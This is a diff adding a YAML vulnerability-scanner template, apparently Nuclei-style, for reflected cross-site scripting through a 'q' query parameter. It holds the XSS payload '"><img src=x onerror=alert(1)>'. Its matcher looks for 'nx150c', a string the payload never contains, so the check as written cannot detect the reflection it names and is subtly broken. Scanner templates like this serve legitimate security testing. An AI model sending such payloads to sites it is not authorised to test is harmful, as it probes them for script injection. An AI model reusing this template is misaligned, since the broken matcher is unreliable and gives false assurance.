@@ -1,0 +1,20 @@
+id: xss-151
+name: 'Reflected XSS ctx-5 via q'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in q'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      q:
+        - '"><img src=x onerror=alert(1)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx150c'
